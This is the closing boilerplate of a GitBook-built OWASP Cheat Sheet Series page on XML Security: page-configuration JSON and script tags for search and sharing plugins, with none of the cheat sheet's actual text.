            gitbook.page.hasChanged({"page":{"title":"XML Security ","level":"1.69","depth":1,"previous":{"title":"XML External Entity Prevention ","level":"1.68","depth":1,"path":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md","ref":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md","articles":[]},"dir":"ltr"},"config":{"plugins":["anchors"],"root":"./cheatsheets","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"anchors":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"Preface.md","glossary":"GLOSSARY.md","summary":"TOC.md"},"variables":{},"title":"OWASP Cheat Sheet Series","language":"en","gitbook":"*","description":"Website with the collection of all the cheat sheets of the project."},"file":{"path":"cheatsheets/XML_Security_Cheat_Sheet.md","mtime":"2019-12-12T14:46:07.033Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-12-12T14:46:31.946Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

